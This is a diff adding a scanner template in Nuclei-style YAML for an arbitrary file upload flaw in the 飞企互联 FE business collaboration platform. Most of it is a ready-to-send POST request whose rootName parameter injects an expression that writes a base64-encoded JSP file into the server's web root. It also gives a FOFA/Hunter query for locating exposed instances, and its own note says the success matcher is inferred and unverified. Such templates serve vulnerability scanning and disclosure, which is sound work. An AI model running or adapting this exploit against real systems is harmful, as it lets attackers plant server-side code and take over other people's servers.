@@ -1,0 +1,44 @@
+id: poc-3678be6003a0b4ea1fbd
+info:
+  name: 飞企互联FE业务协作平台common_sort_tree存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3678be6003a0b4ea1fbd01effbda3f91
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 3678be6003a0b4ea1fbd01effbda3f91
+    fofa: + hunter`app.name=="飞企互联 FE 6.0+"||app.name=="飞企互联 FE"`
+http:
+- raw:
+  - 'POST /common/common_sort_tree.jsp;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: JSESSIONID=DDA007F5B06EF7B049214B54838A17F8
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 290
+
+
+    rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/stc.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("PCUgb3V0LnByaW50bG4oMTExKjExMSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg=="))%25}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
